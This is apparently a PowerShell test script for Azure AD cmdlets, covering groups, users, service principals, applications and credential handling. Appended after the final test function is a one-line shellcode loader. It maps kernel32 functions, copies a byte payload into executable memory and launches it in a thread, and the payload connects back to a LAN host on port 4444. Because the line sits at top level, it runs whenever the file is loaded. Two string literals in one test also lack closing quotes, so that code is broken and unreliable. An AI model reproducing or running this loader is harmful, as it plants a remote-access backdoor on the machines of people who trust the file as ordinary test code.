














function Test-GetAllADGroups
{
    
    $groups = Get-AzADGroup

    
    Assert-NotNull($groups)
    foreach($group in $groups) {
        Assert-NotNull($group.DisplayName)
        Assert-NotNull($group.Id)
    }
}


function Test-GetADGroupWithSearchString
{
    param([string]$displayName)

    
    
    $groups = Get-AzADGroup -SearchString $displayName

    
    Assert-AreEqual $groups.Count 1
    Assert-NotNull $groups[0].Id
    Assert-AreEqual $groups[0].DisplayName $displayName
}


function Test-GetADGroupWithBadSearchString
{
    
    
    $groups = Get-AzADGroup -SearchString "BadSearchString"

    
    Assert-Null($groups)
}


function Test-GetADGroupWithObjectId
{
    param([string]$objectId)

    
    $groups = Get-AzADGroup -ObjectId $objectId

    
    Assert-AreEqual $groups.Count 1
    Assert-AreEqual $groups[0].Id $objectId
    Assert-NotNull($groups[0].DisplayName)
}


function Test-GetADGroupSecurityEnabled
{
    param([string]$objectId, [string]$securityEnabled)

    
    $groups = Get-AzADGroup -ObjectId $objectId

    
    Assert-AreEqual $groups.Count 1
    Assert-AreEqual $groups[0].Id $objectId
    Assert-AreEqual $groups[0].SecurityEnabled $securityEnabled
    Assert-NotNull($groups[0].DisplayName)
}


function Test-GetADGroupWithBadObjectId
{
    
    $groups = Get-AzADGroup -ObjectId "baadc0de-baad-c0de-baad-c0debaadc0de"

    
    Assert-Null $groups
}


function Test-GetADGroupWithUserObjectId
{
    param([string]$objectId)

    
    $groups = Get-AzADGroup -ObjectId $objectId

    
    Assert-Null $groups
}


function Test-GetADGroupMemberWithGroupObjectId
{
    param([string]$groupObjectId, [string]$userObjectId, [string]$userName)

    
    $members = Get-AzADGroupMember -GroupObjectId $groupObjectId

    
    Assert-AreEqual $members.Count 1
    Assert-AreEqual $members[0].Id $userObjectId
    Assert-AreEqual $members[0].DisplayName $userName
}


function Test-GetADGroupMemberWithBadGroupObjectId
{
    
    Assert-Throws { Get-AzADGroupMember -GroupObjectId "baadc0de-baad-c0de-baad-c0debaadc0de" }
}


function Test-GetADGroupMemberWithUserObjectId
{
    param([string]$objectId)

    
    Assert-Throws { Get-AzADGroupMember -GroupObjectId $objectId }
}


function Test-GetADGroupMemberFromEmptyGroup
{
    param([string]$objectId)

    
    $members = Get-AzADGroupMember -GroupObjectId $objectId

    
    Assert-Null($members)
}


function Test-GetADServicePrincipalWithObjectId
{
    param([string]$objectId)

    
    $servicePrincipals = Get-AzADServicePrincipal -ObjectId $objectId

    
    Assert-AreEqual $servicePrincipals.Count 1
    Assert-AreEqual $servicePrincipals[0].Id $objectId
}


function Test-GetADServicePrincipalWithBadObjectId
{
    
    $servicePrincipals = Get-AzADServicePrincipal -ObjectId "baadc0de-baad-c0de-baad-c0debaadc0de"

    
    Assert-Null($servicePrincipals)
}


function Test-GetADServicePrincipalWithUserObjectId
{
    param([string]$objectId)

    
    $servicePrincipals = Get-AzADServicePrincipal -ObjectId $objectId

    
    Assert-Null($servicePrincipals)
}


function Test-GetADServicePrincipalWithSPN
{
    param([string]$SPN)

    
    $servicePrincipals = Get-AzADServicePrincipal -ServicePrincipalName $SPN

    
    Assert-AreEqual $servicePrincipals.Count 1
    Assert-NotNull $servicePrincipals[0].Id
    Assert-True { $servicePrincipals[0].ServicePrincipalNames.Contains($SPN) }
}


function Test-GetADServicePrincipalWithBadSPN
{
    
    $servicePrincipals = Get-AzADServicePrincipal -ServicePrincipalName "badspn"

    
    Assert-Null($servicePrincipals)
}


function Test-GetADServicePrincipalWithSearchString
{
    param([string]$displayName)

    
    $servicePrincipals = Get-AzADServicePrincipal -SearchString $displayName

    
    Assert-AreEqual $servicePrincipals.Count 1
    Assert-AreEqual $servicePrincipals[0].DisplayName $displayName
    Assert-NotNull($servicePrincipals[0].Id)
    Assert-NotNull($servicePrincipals[0].ServicePrincipalNames)
    Assert-AreEqual $servicePrincipals[0].ServicePrincipalNames.Count 2
}


function Test-GetADServicePrincipalWithBadSearchString
{
    
    $servicePrincipals = Get-AzADServicePrincipal -SearchString "badsearchstring"

    
    Assert-Null($servicePrincipals)
}


function Test-GetAllADUser
{
    
    $users = Get-AzADUser

    
    Assert-NotNull($users)
    foreach($user in $users) {
        Assert-NotNull($user.DisplayName)
        Assert-NotNull($user.Id)
    }
}


function Test-GetADUserWithObjectId
{
    param([string]$objectId)

    
    $users = Get-AzADUser -ObjectId $objectId

    
    Assert-AreEqual $users.Count 1
    Assert-AreEqual $users[0].Id $objectId
    Assert-NotNull($users[0].DisplayName)
    Assert-NotNull($users[0].UserPrincipalName)
}



function Test-GetADUserWithMail
{
    param([string]$mail)

    
    $users = Get-AzADUser -Mail $mail

    
    Assert-AreEqual $users.Count 1
    
    Assert-NotNull($users[0].DisplayName)
    Assert-NotNull($users[0].UserPrincipalName)
}


function Test-GetADUserWithBadObjectId
{
    
    $users = Get-AzADUser -ObjectId "baadc0de-baad-c0de-baad-c0debaadc0de"

    
    Assert-Null($users)
}


function Test-GetADUserWithGroupObjectId
{
    param([string]$objectId)

    
    $users = Get-AzADUser -ObjectId $objectId

    
    Assert-Null($users)
}


function Test-GetADUserWithUPN
{
    param([string]$UPN)

    
    $users = Get-AzADUser -UserPrincipalName $UPN

    
    Assert-AreEqual $users.Count 1
    Assert-AreEqual $users[0].UserPrincipalName $UPN
    Assert-NotNull($users[0].DisplayName)
    Assert-NotNull($users[0].Id)
}


function Test-GetADUserWithFPOUPN
{
    
    $users = Get-AzADUser -UserPrincipalName "azsdkposhteam_outlook.com

    
    Assert-AreEqual $users.Count 1
    Assert-AreEqual $users[0].UserPrincipalName "azsdkposhteam_outlook.com
    Assert-NotNull($users[0].DisplayName)
    Assert-NotNull($users[0].Id)
}


function Test-GetADUserWithBadUPN
{
    
    $users = Get-AzADUser -UserPrincipalName "baduser@rbactest.onmicrosoft.com"

    
    Assert-Null($users)
}


function Test-GetADUserWithSearchString
{
    param([string]$displayName)

    
    
    $users = Get-AzADUser -SearchString $displayName

    
    Assert-NotNull($users)
    Assert-AreEqual $users[0].DisplayName $displayName
    Assert-NotNull($users[0].Id)
    Assert-NotNull($users[0].UserPrincipalName)
}


function Test-GetADUserWithBadSearchString
{
    
    
    $users = Get-AzADUser -SearchString "badsearchstring"

    
    Assert-Null($users)
}


function Test-NewADApplication
{
    
    $displayName = getAssetName
    $homePage = "http://" + $displayName + ".com"
    $identifierUri = "http://" + $displayName

    
    $application = New-AzADApplication -DisplayName $displayName -HomePage $homePage -IdentifierUris $identifierUri

    
    Assert-NotNull $application
    $apps =  Get-AzADApplication
    Assert-NotNull $apps
    Assert-True { $apps.Count -ge 0 }

	
	$app1 =  Get-AzADApplication -ObjectId $application.ObjectId
	Assert-NotNull $app1
	Assert-AreEqual $app1.Count 1

    
    $app1 =  Get-AzADApplication -ApplicationId $application.ApplicationId
    Assert-NotNull $app1
    Assert-AreEqual $app1.Count 1

    
    $app1 = Get-AzADApplication -IdentifierUri $application.IdentifierUris[0]
    Assert-NotNull $app1
    Assert-AreEqual $app1.Count 1

    
    $app1 = Get-AzADApplication -DisplayNameStartWith $application.DisplayName
    Assert-NotNull $app1
    Assert-True { $app1.Count -ge 1}

    $newDisplayName = getAssetName
    $newHomePage = "http://" + $newDisplayName + ".com"
    $newIdentifierUri = "http://" + $newDisplayName

    
    Set-AzADApplication -ObjectId $application.ObjectId -DisplayName $newDisplayName -HomePage $newHomePage

    
    Set-AzADApplication -ApplicationId $application.ApplicationId -IdentifierUris $newIdentifierUri

    
    $app1 =  Get-AzADApplication -ObjectId $application.ObjectId
    Assert-NotNull $app1
    Assert-AreEqual $app1.Count 1
    Assert-AreEqual $app1.DisplayName $newDisplayName
    Assert-AreEqual $app1.HomePage $newHomePage
    Assert-AreEqual $app1.IdentifierUris[0] $newIdentifierUri

    
    Remove-AzADApplication -ObjectId $application.ObjectId -Force
}


function Test-NewADServicePrincipal
{
    param([string]$applicationId)

    
    $servicePrincipal = New-AzADServicePrincipal -ApplicationId $applicationId

    
    Assert-NotNull $servicePrincipal

    
    $sp1 = Get-AzADServicePrincipal -ObjectId $servicePrincipal.Id
    Assert-NotNull $sp1
    Assert-AreEqual $sp1.Count 1
    Assert-AreEqual $sp1.Id $servicePrincipal.Id

    
    $sp1 = Get-AzADServicePrincipal -ServicePrincipalName $servicePrincipal.ServicePrincipalNames[0]
    Assert-NotNull $sp1
    Assert-AreEqual $sp1.Count 1
    Assert-True { $sp1.ServicePrincipalNames.Contains($servicePrincipal.ServicePrincipalNames[0]) }

    
    Remove-AzADServicePrincipal -ObjectId $servicePrincipal.Id -Force
}


function Test-NewADServicePrincipalWithoutApp
{
    
    $displayName = getAssetName

    
    $servicePrincipal = New-AzADServicePrincipal -DisplayName $displayName
	$role = Get-AzRoleAssignment -ObjectId $servicePrincipal.Id

    
    Assert-NotNull $servicePrincipal
    Assert-AreEqual $servicePrincipal.DisplayName $displayName
	Assert-Null $role

    
    $sp1 = Get-AzADServicePrincipal -ObjectId $servicePrincipal.Id
    Assert-NotNull $sp1
    Assert-AreEqual $sp1.Count 1
    Assert-AreEqual $sp1.Id $servicePrincipal.Id

    
    $sp1 = Get-AzADServicePrincipal -ServicePrincipalName $servicePrincipal.ServicePrincipalNames[0]
    Assert-NotNull $sp1
    Assert-AreEqual $sp1.Count 1
    Assert-True { $sp1.ServicePrincipalNames.Contains($servicePrincipal.ServicePrincipalNames[0]) }

    
    $app1 =  Get-AzADApplication -ApplicationId $servicePrincipal.ApplicationId
    Assert-NotNull $app1
    Assert-AreEqual $app1.Count 1

    
    $newDisplayName = getAssetName

    Set-AzADServicePrincipal -ObjectId $servicePrincipal.Id -DisplayName $newDisplayName

    
    $sp1 = Get-AzADServicePrincipal -ObjectId $servicePrincipal.Id
    Assert-NotNull $sp1
    Assert-AreEqual $sp1.Count 1
    Assert-AreEqual $sp1.DisplayName $newDisplayName

    
    Remove-AzADApplication -ObjectId $app1.ObjectId -Force

    Assert-Throws { Remove-AzADServicePrincipal -ObjectId $servicePrincipal.Id -Force}
}


function Test-NewADServicePrincipalWithReaderRole
{
	
	$displayName = getAssetName
	$roleDefinitionName = "Reader"

	
	$servicePrincipal = New-AzADServicePrincipal -DisplayName $displayName -Role $roleDefinitionName
	Assert-NotNull $servicePrincipal
	Assert-AreEqual $servicePrincipal.DisplayName $displayName

	try
	{
		$role = Get-AzRoleAssignment -ObjectId $servicePrincipal.Id
		Assert-AreEqual $role.Count 1
		Assert-AreEqual $role.DisplayName $servicePrincipal.DisplayName
		Assert-AreEqual $role.ObjectId $servicePrincipal.Id
		Assert-AreEqual $role.RoleDefinitionName $roleDefinitionName
		Assert-AreEqual $role.ObjectType "ServicePrincipal"
	}
	finally
	{
		Remove-AzADApplication -ApplicationId $servicePrincipal.ApplicationId -Force
		Remove-AzRoleAssignment -ObjectId $servicePrincipal.Id -RoleDefinitionName $roleDefinitionName
	}
}


function Test-NewADServicePrincipalWithCustomScope
{
	
	$displayName = getAssetName
	$defaultRoleDefinitionName = "Contributor"
	$subscription = Get-AzSubscription | Select -Last 1 -Wait
	$resourceGroup = Get-AzResourceGroup | Select -Last 1 -Wait
	$scope = "/subscriptions/" + $subscription.Id + "/resourceGroups/" + $resourceGroup.ResourceGroupName

	
	$servicePrincipal = New-AzADServicePrincipal -DisplayName $displayName -Scope $scope
	Assert-NotNull $servicePrincipal
	Assert-AreEqual $servicePrincipal.DisplayName $displayName

	try
	{
		$role = Get-AzRoleAssignment -ObjectId $servicePrincipal.Id
		Assert-AreEqual $role.Count 1
		Assert-AreEqual $role.DisplayName $servicePrincipal.DisplayName
		Assert-AreEqual $role.ObjectId $servicePrincipal.Id
		Assert-AreEqual $role.RoleDefinitionName $defaultRoleDefinitionName
		Assert-AreEqual $role.Scope $scope
		Assert-AreEqual $role.ObjectType "ServicePrincipal"
	}
	finally
	{
		Remove-AzADApplication -ApplicationId $servicePrincipal.ApplicationId -Force
		Remove-AzRoleAssignment -ObjectId $servicePrincipal.Id -Scope $scope -RoleDefinitionName $defaultRoleDefinitionName
	}
}


function Test-CreateDeleteAppCredentials
{
    
	$getAssetName = ConvertTo-SecureString "test" -AsPlainText -Force
    $displayName = "test"
    $identifierUri = "http://" + $displayName
    $password = $getAssetName
	$keyId1 = "316af45c-83ff-42a5-a1d1-8fe9b2de3ac1"
	$keyId2 = "9b7fda23-cb39-4504-8aa6-3570c4239620"
	$keyId3 = "4141b479-4ca0-4919-8451-7e155de6aa0f"

    
    $application = New-AzADApplication -DisplayName $displayName -IdentifierUris $identifierUri -Password $password

    
    Assert-NotNull $application
	Try {
    
    $app1 =  Get-AzADApplication -ObjectId $application.ObjectId
    Assert-NotNull $app1

    
    $cred1 = Get-AzADAppCredential -ObjectId $application.ObjectId
    Assert-NotNull $cred1
    Assert-AreEqual $cred1.Count 1

    
    $start = (Get-Date).ToUniversalTime()
    $end = $start.AddYears(1)
    $cred = New-AzADAppCredentialWithId -ObjectId $application.ObjectId -Password $password -StartDate $start -EndDate $end -KeyId $keyId1
    Assert-NotNull $cred

    
    $cred2 = Get-AzADAppCredential -ObjectId $application.ObjectId
    Assert-NotNull $cred2
    Assert-AreEqual $cred2.Count 2
    $credCount = $cred2 | where {$_.KeyId -in $cred1.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 2
	$cred2 = $cred

	
	$certPath = Join-Path $ResourcesPath "certificate.pfx"
	$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath)

	$binCert = $cert.GetRawCertData()
	$credValue = [System.Convert]::ToBase64String($binCert)
	$start = (Get-Date).ToUniversalTime()
	$end = $start.AddDays(1)
	$cred = New-AzADAppCredentialWithId -ObjectId $application.ObjectId -CertValue $credValue -StartDate $start -EndDate $end -KeyId $keyId2
    Assert-NotNull $cred

    
    $cred3 = Get-AzADAppCredential -ObjectId $application.ObjectId
    Assert-NotNull $cred3
    Assert-AreEqual $cred3.Count 3
    $credCount = $cred3 | where {$_.KeyId -in $cred1.KeyId, $cred2.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 3
	$cred3 = $cred

	
	$binCert = $cert.GetRawCertData()
	$credValue = [System.Convert]::ToBase64String($binCert)
	$start = (Get-Date).ToUniversalTime()
	$end = $start.AddDays(1)
	$cred = New-AzADAppCredentialWithId -ObjectId $application.ObjectId -CertValue $credValue -StartDate $start -EndDate $end -KeyId $keyId3
    Assert-NotNull $cred

    
    $cred4 = Get-AzADAppCredential -ObjectId $application.ObjectId
    Assert-NotNull $cred4
    Assert-AreEqual $cred4.Count 4
    $credCount = $cred4 | where {$_.KeyId -in $cred1.KeyId, $cred2.KeyId, $cred3.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 4

    
    Remove-AzADAppCredential -ApplicationId $application.ApplicationId -KeyId $cred.KeyId -Force
    $cred5 = Get-AzADAppCredential -ApplicationId $application.ApplicationId
    Assert-NotNull $cred5
    Assert-AreEqual $cred5.Count 3
    Assert-AreEqual $cred5[2].KeyId $cred1.KeyId

    
    Remove-AzADAppCredential -ObjectId $application.ObjectId -Force
    $cred5 = Get-AzADAppCredential -ObjectId $application.ObjectId
    Assert-Null $cred5                     
	 
    $newApplication = Get-AzADApplication -DisplayNameStartWith "PowershellTestingApp"
    Assert-Throws { New-AzADAppCredential -ApplicationId $newApplication.ApplicationId -Password "Somedummypwd"}
	}
	Finally{
		
		Remove-AzADApplication -ObjectId $application.ObjectId -Force
	}
}



function Test-CreateDeleteSpCredentials
{
	param([string]$applicationId)

    
	$getAssetName = ConvertTo-SecureString "test" -AsPlainText -Force
    $displayName = "test"
    $identifierUri = "http://" + $displayName
	$password = $getAssetName
	$keyId1 = "316af45c-83ff-42a5-a1d1-8fe9b2de3ac1"
	$keyId2 = "9b7fda23-cb39-4504-8aa6-3570c4239620"
	$keyId3 = "4141b479-4ca0-4919-8451-7e155de6aa0f"

    
    $servicePrincipal = New-AzADServicePrincipal -DisplayName $displayName -ApplicationId $applicationId

    
    Assert-NotNull $servicePrincipal

    Try
    {
    
    $sp1 =  Get-AzADServicePrincipal -ObjectId $servicePrincipal.Id
    Assert-NotNull $sp1.Id

    
    $cred1 = Get-AzADSpCredential -ObjectId $servicePrincipal.Id
    Assert-NotNull $cred1
    Assert-AreEqual $cred1.Count 1

    
    $start = (Get-Date).ToUniversalTime()
    $end = $start.AddYears(1)
    $cred = New-AzADSpCredentialWithId -ObjectId $servicePrincipal.Id -StartDate $start -EndDate $end -KeyId $keyId1
    Assert-NotNull $cred

    
    $cred2 = Get-AzADSpCredential -ObjectId $servicePrincipal.Id
    Assert-NotNull $cred2
    Assert-AreEqual $cred2.Count 2
    $credCount = $cred2 | where {$_.KeyId -in $cred1.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 2
	$cred2 = $cred

	
	$certPath = Join-Path $ResourcesPath "certificate.pfx"
	$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath)

	$binCert = $cert.GetRawCertData()
	$credValue = [System.Convert]::ToBase64String($binCert)
	$start = (Get-Date).ToUniversalTime()
	$end = $start.AddDays(1)
	$cred = New-AzADSpCredentialWithId -ObjectId $servicePrincipal.Id -CertValue $credValue -StartDate $start -EndDate $end -KeyId $keyId2
    Assert-NotNull $cred

    
    $cred3 = Get-AzADSpCredential -ObjectId $servicePrincipal.Id
    Assert-NotNull $cred3
    Assert-AreEqual $cred3.Count 3
    $credCount = $cred3 | where {$_.KeyId -in $cred1.KeyId, $cred2.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 3
	$cred3 = $cred

	
	$binCert = $cert.GetRawCertData()
	$credValue = [System.Convert]::ToBase64String($binCert)
	$start = (Get-Date).ToUniversalTime()
	$end = $start.AddDays(1)
	$cred = New-AzADSpCredentialWithId -ObjectId $servicePrincipal.Id -CertValue $credValue -StartDate $start -EndDate $end -KeyId $keyId3
    Assert-NotNull $cred

    
    $cred4 = Get-AzADSpCredential -ObjectId $servicePrincipal.Id
    Assert-NotNull $cred4
    Assert-AreEqual $cred4.Count 4
    $credCount = $cred4 | where {$_.KeyId -in $cred1.KeyId, $cred2.KeyId, $cred3.KeyId, $cred.KeyId}
    Assert-AreEqual $credCount.Count 4


    
    Remove-AzADSpCredential -ServicePrincipalName $servicePrincipal.ServicePrincipalNames[0] -KeyId $cred.KeyId -Force
    $cred5 = Get-AzADSpCredential -ServicePrincipalName $servicePrincipal.ServicePrincipalNames[0]
    Assert-NotNull $cred5
    Assert-AreEqual $cred5.Count 3
    Assert-AreEqual $cred5[2].KeyId $cred1.KeyId

    
    Remove-AzADSpCredential -ObjectId $servicePrincipal.Id -Force
    $cred5 = Get-AzADSpCredential -ObjectId $servicePrincipal.Id
    Assert-Null $cred5
    }
    Finally
    {
		
		Remove-AzADServicePrincipal -ObjectId $servicePrincipal.Id -Force
    }
}


function Test-RemoveServicePrincipalWithNameNotFound
{
    $FakeServicePrincipalName = "this is a fake service principal name and there are no way this can be valid"

    Assert-ThrowsContains {Remove-AzADServicePrincipal -ServicePrincipalName $FakeServicePrincipalName} "Could not find a service principal with the name"
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x16,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

